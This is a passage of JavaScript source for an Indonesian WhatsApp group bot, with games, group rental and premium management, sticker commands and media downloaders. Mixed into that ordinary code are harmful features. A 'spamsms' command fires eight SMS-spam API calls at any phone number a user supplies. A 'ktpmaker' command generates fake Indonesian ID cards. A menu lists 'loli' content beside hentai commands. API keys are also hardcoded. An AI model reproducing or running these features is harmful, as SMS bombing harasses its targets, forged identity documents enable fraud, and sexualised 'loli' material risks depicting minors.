					'🍋 : 🍋 : 🍌',
					'🔔 : 🔔 : 🍇',
					'🔔 : 🍐 : 🍇',
					'🔔 : 🔔 : 🔔',
					'🍒 : 🍒 : 🍒',
					'🍌 : 🍌 : 🍌',
					'🍇 : ?? : 🍇'
				]
				somtoy = sotoy[
					Math
					.floor(
						Math
						.random() *
						(sotoy
							.length
						)
					)]
				somtoyy = sotoy[
					Math
					.floor(
						Math
						.random() *
						(sotoy
							.length
						)
					)]
				somtoyyy =
					sotoy[Math
						.floor(
							Math
							.random() *
							(sotoy
								.length
							)
						)]
				if (somtoyy ==
					'🍌 : 🍌 : 🍌'
				) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`
					)
				} else if (
					somtoyy ==
					'?? : 🍒 : 🍒'
				) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`
					)
				} else if (
					somtoyy ==
					'🔔 : 🔔 : 🔔'
				) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`
					)
				} else if (
					somtoyy ==
					'?? : 🍐 : 🍐'
				) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`
					)
				} else if (
					somtoyy ==
					'🍇 : 🍇 : 🍇'
				) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`
					)
				} else {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`
					)
				}
				break

			case 'suit':
				//titidkau
				buttons = [{
					buttonId: `${prefix}ok batu`,
					buttonText: {
						displayText: 'BATU'
					},
					type: 1
				}, {
					buttonId: `${prefix}ok kertas`,
					buttonText: {
						displayText: 'KERTAS'
					},
					type: 1
				}, {
					buttonId: `${prefix}ok gunting`,
					buttonText: {
						displayText: 'GUNTING'
					},
					type: 1
				}]

				buttonsMessage
					= {
						contentText: `SUIT GAME`,
						footerText: 'Copyright By ©Maslent',
						buttons: buttons,
						headerType: 1
					}

				prep =
					await Maslent
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				Maslent
					.relayWAMessage(
						prep)
				break
			case 'ok':
				//titidkau
				if (!q) return reply(
					`Kirim perintah ${prefix}suit gunting / batu / kertas`
				)
				const
					userspilih =
					q
				if (!userspilih
					.match(
						/batu|gunting|kertas/
					))
					return reply(
						`Pilih batu, kertas, gunting`
					)
				var computer =
					Math
					.random();
				if (computer <
					0.34) {
					computer =
						'batu';
				} else if (
					computer >=
					0.34 &&
					computer <
					0.67) {
					computer =
						'gunting';
				} else {
					computer =
						'kertas';
				}
				if (userspilih ==
					computer) {
					reply(
						`Pertandingan Seri!`
					)
				} else if (
					userspilih ==
					'batu') {
					if (computer ==
						'gunting'
					) {
						reply(
							`Kamu memilih Batu dan bot Gunting\nKamu menang!`
						)
					} else {
						reply(
							`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`
						)
					}
				} else if (
					userspilih ==
					'gunting') {
					if (computer ==
						'batu'
					) {
						reply(
							`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`
						)
					} else {
						reply(
							`Kamu memilih Gunting dan bot Kertas\nKamu menang!`
						)
					}
				} else if (
					userspilih ==
					'kertas') {
					if (computer ==
						'batu'
					) {
						reply(
							`Kamu memilih Kertas dan bot Batu\nKamu menang!`
						)
					} else {
						reply(
							`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`
						)
					}
				}
				break
				//------------------< Sewa >-------------------
			case 'sewa':
				//titidkau
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
					)
				if (args
					.length < 1)
					return reply(
						`Penggunaan :\n*${prefix}sewa* add/del waktu`
					)
				if (args[0]
					.toLowerCase() ===
					'add') {
					_sewa
						.addSewaGroup(
							from,
							args[
								1
							],
							sewa
						)
					reply(
						`Success`
					)
				} else if (args[
						0]
					.toLowerCase() ===
					'del') {
					sewa.splice(
						_sewa
						.getSewaPosition(
							from,
							sewa
						),
						1)
					fs.writeFileSync(
						'./database/group/sewa.json',
						JSON
						.stringify(
							sewa
						)
					)
					reply(mess
						.success
					)
				} else {
					reply(
						`Penggunaan :\n*${prefix}sewa* add/del waktu`
					)
				}
				break
			case 'sewalist':
			case 'listsewa':
				//titidkau
				let txtnyee =
					`List Sewa\nJumlah : ${sewa.length}\n\n`
				for (let i of
						sewa) {
					let cekvipp =
						ms(i.expired -
							Date
							.now()
						)
					txtnyee +=
						`*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
				}
				reply(txtnyee)
				break

			case 'tutuptime':
			case 'closetimer':
			case 'waktututup':
				//titidkau
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!
					isGroupAdmins &&
					!isOwner)
					return reply(
						mess
						.only
						.admin
					)

				if (args[1] ==
					"detik") {
					var timer =
						args[
							0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
							0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
							0] +
						"00000"
				} else {
					return reply(
						"[ ! ] ```Contoh:``` !closetimer 20 detik"
					)
				}
				reply(
					`[ ! ] Grup akan ditutup oleh ${pushname} dalam beberapa saat lagi.`
				)
				setTimeout(
					() => {
						var nomor =
							mek
							.participant
						Maslent
							.groupSettingChange(
								from,
								GroupSettingChange
								.messageSend,
								true
							);
					},
					timer)
				break
			case 'bukatime':
			case 'opentimer':
			case 'waktubuka':
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!
					isGroupAdmins &&
					!isOwner)
					return reply(
						mess
						.only
						.admin
					)

				if (args[1] ==
					"detik") {
					var timer =
						args[
							0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
							0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
							0] +
						"00000"
				} else {
					return reply(
						"[ ! ] ```Contoh:``` !opentimer 20 detik"
					)
				}
				reply(
					`[ ! ] Grup akan dibuka oleh ${pushname} dalam beberapa saat lagi.`
				)
				setTimeout(
					() => {
						var nomor =
							mek
							.participant
						Maslent
							.groupSettingChange(
								from,
								GroupSettingChange
								.messageSend,
								false
							);
					},
					timer)
				break
			case 'verify':
				if (
					isRegistered
				)
					return sticOk(
						from
					)
				const
					serialUser =
					createSerial(
						18)
				veri = sender
				_registered
					.push(
						sender)
				fs.writeFileSync(
					'./database/registered.json',
					JSON
					.stringify(
						_registered
					))
				addRegisteredUser
					(sender,
						serialUser
					)
				const jancok =
					` 「 pendaftaran 」 
Okeee Terima Kasih telah daftar di JojoBot
Silahkan Akses dengan cara ketik !menu

 Nama : ${pushname}
 Nomer : ${sender.split('@')[0]}
 un/snk : ${serialUser}
 Pengguna : ${_registered.length}

ayo Dong kak subs chanel Maslent ketik !chnl`
				gbutsan = [
				{
					buttonId: `/menu`,
					buttonText: {
						displayText: 'ALL menu'
					},
					type: 1
				},
				{
					buttonId: `/owner`,
					buttonText: {
						displayText: 'SIMPLE MENU'
					},
					type: 1
				}]
				mhan =
					await Maslent
					.prepareMessage(
						from,
						thumb,
						sticker, {
							thumbnail: thumb
						})
				const
					sendBtnVeryy = {
						imageMessage: mhan
							.message
							.imageMessage,
						contentText: `${jancok}`,
						footerText: 'Bagi Kalian Pengguna Wa Mod, Silahkan Ketik #verify Untuk Mendaftar Ke Database Bot\nBy @sofunsyabi.id',
						buttons: gbutsan,
						headerType: 4
					}
				Maslent
					.sendMessage(
						from,
						sendBtnVeryy,
						MessageType
						.buttonsMessage, {
							quoted: mek,
							contextInfo: {
								mentionedJid: [
									sender
								]
							}
						})
				console.log(
					color(
						'[REGISTER]'
					),
					color(
						time,
						'yellow'
					),
					'Serial:',
					color(
						serialUser,
						'cyan'
					),
					'in',
					color(
						sender ||
						groupName
					))
				// console.log(e)
				break
			case 'sewacheck':
			case 'ceksewa':
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!isSewa)
					return reply(
						`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`
					)
				let cekvip = ms(
					_sewa
					.getSewaExpired(
						from,
						sewa
					) -
					Date
					.now())
				let premiumnya =
					`*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
				reply(
					premiumnya
				)
				break
			case 'spamsms':
				if (args
					.length == 0
				) return reply(
					`Example: ${prefix + command} 08303030303030`
				)
				nomor = args[0]
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam1?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam2?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam3?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam4?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam5?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam6?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam7?apikey=genbotkey&nomor=${nomor}`
				)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam8?apikey=genbotkey&nomor=${nomor}`
				)
				reply("Success")
				break
				//------------------< Premium >-------------------
			case 'premium':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
					)
				if (args[0] ===
					'add') {
					if (mek
						.message
						.extendedTextMessage !=
						undefined
					) {
						mentioned
							=
							mek
							.message
							.extendedTextMessage
							.contextInfo
							.mentionedJid

						premium
							.addPremiumUser(
								mentioned[
									0
								],
								args[
									2
								],
								_premium
							)
						reply(
							`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`
						)

					} else {

						premium
							.addPremiumUser(
								args[
									1
								] +
								'@s.whatsapp.net',
								args[
									2
								],
								_premium
							)
						reply(
							`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`
						)
					}
				} else if (args[
						0] ===
					'del') {
					if (mek
						.message
						.extendedTextMessage !=
						undefined
					) {
						mentioned
							=
							mek
							.message
							.extendedTextMessage
							.contextInfo
							.mentionedJid
						_premium
							.splice(
								premium
								.getPremiumPosition(
									mentioned[
										0
									],
									_premium
								),
								1
							)
						fs.writeFileSync(
							'./database/user/premium.json',
							JSON
							.stringify(
								_premium
							)
						)
						reply(mess
							.success
						)
					} else {
						_premium
							.splice(
								premium
								.getPremiumPosition(
									args[
										1
									] +
									'@s.whatsapp.net',
									_premium
								),
								1
							)
						fs.writeFileSync(
							'./database/user/premium.json',
							JSON
							.stringify(
								_premium
							)
						)
						reply(mess
							.success
						)
					}
				} else {
					reply(mess
						.wrongFormat
					)
				}
				break
			case 'faketoko':
				await getBuffer(
					teks =
					"Tahu Bacem",
					url_image =
					"https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg",
					title =
					"LoL Human",
					code =
					"IDR",
					price =
					1000000)
				break
			case 'ktpmaker':
				if (args
					.length == 0
				) return reply(
					`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|MaslentBotWa|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`
				)
				get_args = args
					.join(" ")
					.split("|")
				nik = get_args[
					0]
				prov = get_args[
					1]
				kabu = get_args[
					2]
				name = get_args[
					3]
				ttl = get_args[
					4]
				jk = get_args[5]
				jl = get_args[6]
				rtrw = get_args[
					7]
				lurah =
					get_args[8]
				camat =
					get_args[9]
				agama =
					get_args[10]
				nikah =
					get_args[11]
				kerja =
					get_args[12]
				warga =
					get_args[13]
				until =
					get_args[14]
				img = get_args[
					15]
				ini_buffer =
					await getBuffer(
						`https://api.lolhuman.xyz/api/ktpmaker?apikey=Chikey&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`
					)
				await Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek
						})
				break

			case "antilink":
				if (!
					isGroupAdmins
				) return reply(
					mess
					.only
					.admin
				)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
					)
				if (!
					isBotGroupAdmins
				) return reply(
					`Bot Harus jadi Admin`
				)
				if (!q) return reply(
					`Pilih enable atau disable`
				)
				if (args[0]
					.toLowerCase() ===
					'enable') {
					if (
						isAntiLink
					)
						return reply(
							`Udah aktif`
						)
					antilink
						.push(
							from
						)
					fs.writeFileSync(
						'./database/group/antilink.json',
						JSON
						.stringify(
							antilink
						)
					)
					reply(
						'*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!'
					)
				} else if (args[
						0]
					.toLowerCase() ===
					'disable') {
					let anu =
						antilink
						.indexOf(
							from
						)
					antilink
						.splice(
							anu,
							1)
					fs.writeFileSync(
						'./database/group/antilink.json',
						JSON
						.stringify(
							antilink
						)
					)
					reply(
						'*「 ANTILINK DI NONAKTIFKAN 」*'
					)
				} else {
					reply(
						`Pilih enable atau disable`
					)
				}
				break;
			case 'premiumcheck':
			case 'cekpremium':
				if (!isPremium)
					return reply(
						mess
						.only
						.premium
					)
				const cekExp =
					ms(await premium
						.getPremiumExpired(
							sender,
							_premium
						) -
						Date
						.now())
				reply(
					`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`
				)
				break
			case 'listprem':
			case 'listpremium':
				let txt =
					`「 *PREMIUM USER LIST* 」\n\n`
				let men = [];
				for (let i of
						_premium) {
					men.push(i
						.id)
					const
						checkExp =
						ms(i.expired -
							Date
							.now()
						)
					txt +=
						`➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
				}
				mentions(txt,
					men,
					true)
				break

				/*     case 'belipremium':
       case 'buypremium':
       case 'sewabot':
              gopeynya = 'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
              teksnya = `*── 「 PRICE LIST 」 ──*

*SHERLYNN SEWA BOT WA*
FITUR:ANTILINK,WELCOME,ADD,KICK,DEMOTE,DAN MASIH BANYAK LAGI

HARGA PERMANEN:~25k~ PROMO!!! *10K* MINAT? HUBUNGI OWNER`
              Maslent.sendMessage(from, await getBuffer(gopeynya), image, {quoted: mek, caption: teksnya })
              break             
//------------------< bayar menu >-------------------  
case 'bayar':
gopeynya = 'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
teksnya = ` *「PAYMENT」*
• GOPAY : scan diatas
• DANA : 085298064466
• ALL QR : chat owner
• QRISS GOPAY DI ATAS 
━━━━━━━━━━━━━━━━━━━━`
        Maslent.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              break*/

			case 'buttonstik':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「MENU STICKER」*
*き⃟👉 ${prefix}attp* _teks_
*き⃟👉 ${prefix}ttp* _teks_
*き⃟👉 ${prefix}dadu*
*き⃟👉 ${prefix}doge*
*き⃟👉 ${prefix}patrick*
*き⃟👉 ${prefix}gura*
*き⃟👉 ${prefix}stickeranime*
*き⃟👉 ${prefix}semoji* _emoji_
*き⃟👉 ${prefix}sticker* _reply foto/video_
*き⃟👉 ${prefix}smeme* _teks|teks_
*き⃟👉️ ${prefix}swm* _pack|author_
*き⃟👉️ ${prefix}take* _pack|author_`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttondl':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「DOWNLOAD MENU」*
*き⃟👉 ${prefix}fbdl*
*き⃟👉 ${prefix}igdl*
*き⃟👉 ${prefix}twitter*
*き⃟👉 ${prefix}play*
*き⃟👉 ${prefix}ythd*
*き⃟👉 ${prefix}ytmp3*
*き⃟👉 ${prefix}ytmp4*
*き⃟👉 ${prefix}soundcloud*
*き⃟👉 ${prefix}tiktokdl*
*き⃟👉 ${prefix}tiktoknowm*
*き⃟👉 ${prefix}tiktokmp3*
*き⃟👉 ${prefix}mediafire*
*き⃟👉 ${prefix}nhentaipdf* _code_`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttonpen':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「NULIS MENU」*
*き⃟👉 ${prefix}nulis*`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttongame':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya =
					`*「GAME MENU」*
き⃟👉 ${prefix}limitgame*
*き⃟👉 ${prefix}slot*
*き⃟👉 ${prefix}gelud* _@tag_
*き⃟👉 ${prefix}tictactoe* _@tag_
*き⃟👉 ${prefix}siapaaku*
*き⃟👉 ${prefix}family100*
*き⃟👉 ${prefix}kuismath*
*き⃟👉 ${prefix}asahotak*
*き⃟👉 ${prefix}tebaklirik*
*き⃟👉 ${prefix}tebaklagu*
*き⃟👉 ${prefix}tebakkata*
*き⃟👉 ${prefix}susunkata*
*き⃟👉 ${prefix}kimiakuis*
*き⃟👉 ${prefix}caklontong*
*き⃟👉 ${prefix}tebakjenaka*
*き⃟👉 ${prefix}tebakanime*
*き⃟👉 ${prefix}tebaktebakan*
*き⃟👉 ${prefix}tebakgambar*
*き⃟👉 ${prefix}tebakumur*
*き⃟👉 ${prefix}tebakbendera*
*き⃟👉 ${prefix}suit* _batu/kertas/gunting_`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttongc':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「GRUP MENU」*
*き⃟👉 ${prefix}groupsetting*
*き⃟👉 ${prefix}getbio* _reply_
*き⃟👉 ${prefix}afk* _alasan_
*き⃟👉 ${prefix}kontak* _nomor|nama_
*き⃟👉 ${prefix}ceksewa*
*き⃟👉 ${prefix}kickall*
*き⃟👉 ${prefix}infogrup*
*き⃟👉 ${prefix}promote*
*き⃟👉 ${prefix}promoteall*
*き⃟👉 ${prefix}demote*
*き⃟👉 ${prefix}demoteall*
*き⃟👉 ${prefix}listonline*
*き⃟👉 ${prefix}tagall* _teks_
*き⃟👉 ${prefix}leave*
*き⃟👉 ${prefix}kick* _reply_
*き⃟👉 ${prefix}add* _628xxx_
*き⃟👉 ${prefix}setnamegc*
*き⃟👉 ${prefix}setppgc*
*き⃟👉 ${prefix}getpp*
*き⃟👉 ${prefix}setdeskgc*
*き⃟👉 ${prefix}sider* _reply chat bot_
*き⃟👉 ${prefix}hidetag* _teks/reply teks_
*き⃟👉 ${prefix}linkgc*
*き⃟👉 ${prefix}getdeskgc*`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttonwibu':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「WIBU MENU」*
*き⃟👉 ${prefix}loli*
*き⃟👉 ${prefix}manga*
*き⃟👉 ${prefix}anime*
*き⃟👉️ ${prefix}lolivideo*
*き⃟👉 ${prefix}husbu*
*き⃟👉️ ${prefix}waifu*
*き⃟👉️ ${prefix}milf*
*き⃟👉 ${prefix}neko*
*き⃟👉️ ${prefix}kanna*
*き⃟👉 ${prefix}sagiri*
*き⃟👉 ${prefix}hentai*
*き⃟👉 ${prefix}cosplay*
*き⃟👉️ ${prefix}wallnime*
*き⃟👉️ ${prefix}kusonime*
*き⃟👉️ ${prefix}megumin*
*き⃟👉 ${prefix}otakudesu*
*き⃟👉️ ${prefix}doujindesu*
*き⃟👉️ ${prefix}storyanime*
*き⃟👉️ ${prefix}otakuongoing*
*き⃟👉 ${prefix}nhentai *code*
*き⃟👉️ ${prefix}nekopoi _link_*
*き⃟👉️ ${prefix}nekopoi3d*
*き⃟👉️ ${prefix}nekopoicosplay*
*き⃟👉 ${prefix}nekopoisearch*`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftext,
							caption: teksnya
						})
				break
			case 'buttonown':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「OWNER MENU」*
*き⃟👉️ ${prefix}bc* _teks_
*き⃟👉 ${prefix}tobc* _audio_
*き⃟👉 ${prefix}term*
*き⃟👉 ${prefix}eval*
*き⃟👉 ${prefix}clearall*
*き⃟👉 ${prefix}leaveall*
*き⃟👉 ${prefix}join* _teks_
*き⃟👉️ ${prefix}shutdown*
*き⃟👉 ${prefix}getquoted*
*き⃟👉 ${prefix}addupdate* _fiturnya_
*き⃟👉️ ${prefix}exif* _nama|author_
*き⃟👉 ${prefix}sewa add/del* _waktunya_
*き⃟👉️ ${prefix}premium add* _@tag|nomor_
*き⃟👉 ${prefix}premium del* _@tag|nomor_
*き⃟👉 ${prefix}setpp*
*き⃟👉 ${prefix}setbio*
*き⃟👉 ${prefix}setname*
*き⃟👉 ${prefix}getpp*
*き⃟👉 ${prefix}sharelock*
*き⃟👉 ${prefix}chat* _nomor|teks_`
				Maslent
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
						),
						image, {
							quoted: ftext,
							caption: teksnya
						})
				break


				//------------------< Sticker Cmd >-------------------
			case 'addcmd':
			case 'setcmd':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
					)
				if (
					isQuotedSticker
				) {
					if (!q)
						return reply(
							`Penggunaan : ${command} cmdnya dan tag stickernya`
						)
					var kodenya =
						mek
						.message
						.extendedTextMessage
						.contextInfo
						.quotedMessage
						.stickerMessage
						.fileSha256
						.toString(
							'base64'
						)
					addCmd(kodenya,
						q)
					textImg(
						"Done!"
					)
				} else {
					reply(
						'tag stickenya'
					)
				}
				break
			case 'delcmd':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
					)
				if (!
					isQuotedSticker
				) return reply(
					`Penggunaan : ${command} tagsticker`
				)
				var kodenya =
					mek.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.stickerMessage
					.fileSha256
					.toString(
						'base64'
					)
				_scommand
					.splice(
						getCommandPosition(
							kodenya
						), 1
					)
				fs.writeFileSync(
					'./database/bot/scommand.json',
					JSON
					.stringify(
						_scommand
					))
				textImg("Done!")
				break
			case 'listcmd':
				let teksnyee =
					`\`\`\`「 LIST STICKER CMD 」\`\`\``
				let cemde = [];
				for (let i of
						_scommand) {
					cemde.push(i
						.id)
					teksnyee +=
						`\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
				}
				mentions(
					teksnyee,
					cemde,
					true)
				break
			case 'addrespon': {
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.owner
					)
				if (args
					.length < 1)
					return reply(
						`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`
					)
				let input1 =
					body.slice(
						11)
				if (!input1
					.includes(
						'|'))
					return reply(
						`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`
					)
				let input =
					input1
					.split("|")
				if (checkCommands(
						input[
							0],
						commandsDB
					) ===
					true)
					return reply(
						`Command tersebut sudah ada`
					)
				addCommands(
					input[
						0],
					input[
						1],
					sender,
					commandsDB
				)
				reply(
					`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`
				)
			}
			break
		case 'dellrespon':
		case 'delrespon': {
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.owner)
			if (args.length < 1)
				return reply(
					`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`
				)
			if (!checkCommands(
					body.slice(
						11),
					commandsDB))
				return reply(
					`Key tersebut tidak ada di database`
				)
			deleteCommands(body
				.slice(11),
				commandsDB)
			reply(
				`Berhasil menghapus respon dengan key ${body.slice(11)}`
			)
		}
		break
		case 'listrespon': {
			let txt =
				`List Respon\nTotal : ${commandsDB.length}\n\n`
			for (let i = 0; i <
				commandsDB
				.length; i++) {
				txt +=
					`❏ Key : ${commandsDB[i].pesan}\n`
			}
			reply(txt)
		}
		break
		//------------------< self and public >---------------------
		//------------------< Downloader/Search/Anime >-------------------
		case 'igdl':
			//
			if (!q) return reply(
				'Linknya?'
			)
			var {
				igDownloader
			} = require(
				'./XNXX1/igdown'
			)
			res =
				await igDownloader(
					`${q}`)
				.catch(e => {
					reply(mess
						.error
						.api
					)
				})
			console.log(res)
			sendMediaURL(from,
				`${res.result.link}`,
				`${res.result.desc}`
			)
			//limitAdd(sender, limit)
			break
		case 'snack':

			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} https://youtu.be/HEq3zZ_0WCU`
			)
			ini_url = args[0]
			ini_url =
				await fetchJson(
					`https://api.lolhuman.xyz/api/snackvideo?apikey=${lolkey}&url=${ini_url}`
				)
			ini_url = ini_url
				.result
			ini_url = ini_url
				.link
			//  if (ini_url.link(".mp4")) ini_type = video
			ini_buffer =
				await getBuffer(
					ini_url)
			await Maslent
				.sendMessage(
					from,
					ini_buffer,
					video, {
						quoted: mek
					})
			break
		case 'lagumeong':
			if (!q) return fakegroup(
				`Link Nya Kawan\nContoh Penggunaan: \n${prefix+command} https://youtu.be/HEq3zZ_0WCU`
			)
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'instagram.com'
				))
				return reply(
					mess.Iv)
			reply(mess.wait)
			hx.igdl(args[0])
				.then(async (
					result
				) => {
					for (
						let i of
							result
							.medias
					) {
						if (i
							.url
							.includes(
								'mp4'
							)
						) {
							let link =
								await getBuffer(
									i
									.url
								)
							Maslent
								.sendMessage(
									from,
									link,
									video, {
										quoted: mek,
										caption: `Type : ${i.type}`
									}
								)
						} else {
							let link =
								await getBuffer(
									i
									.url
								)
							Maslent
								.sendMessage(
									from,
									link,
									image, {
										quoted: mek,
										caption: `Type : ${i.type}`
									}
								)
						}
					}
				});
			limitAdd(sender,
				limit)
			break


		case 'scplay':
		case 'soundcloud':
			if (!q) return reply(
				'Link Yang Mana? '
			)
			if (!q.includes(
					'soundcloud'
				))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/soundcloud?apikey=${setting.lolkey}&url=${q}`
				)
				.then((
					data
				) => {
					sendMediaURL
						(from,
							data
							.result,
							mek
						)
				})
				.catch((
					err
				) => {
					reply(String(
						err
					))
				})
			break
		case 'image':
		case 'gimage':
		case 'googleimage':
			if (args.length < 1)
				return reply(
					'Apa Yang Mau Dicari?'
				)
			reply(mess.wait)
			teks = args.join(
				' ')
			res =
				await googleImage(
					teks, google
				)

			function google(
				error, result) {
				if (error) {
					return reply(
						'_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_'
					)
				}
				else {
					gugIm =
						result
					random =
						gugIm[
							Math
							.floor(
								Math
								.random() *
								gugIm
								.length
							)
						]
						.url
					sendFileFromUrl
						(random,
							image, {
								quoted: mek,
								caption: `*Hasil Pencarian Dari :* ${teks}`
							})
				}
			}
			break
		case 'ytmp3':
			if (args.length < 1)
				return reply(
					'Link Nya Mana?'
				)
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'youtu'))
				return reply(
					mess
					.error
					.Iv)
			teks = args.join(
				' ')
			reply(mess.wait)
			res = await y2mateA(
				teks).catch(
				e => {
					reply(
						'_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_'
					)
				})
			result =
				`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
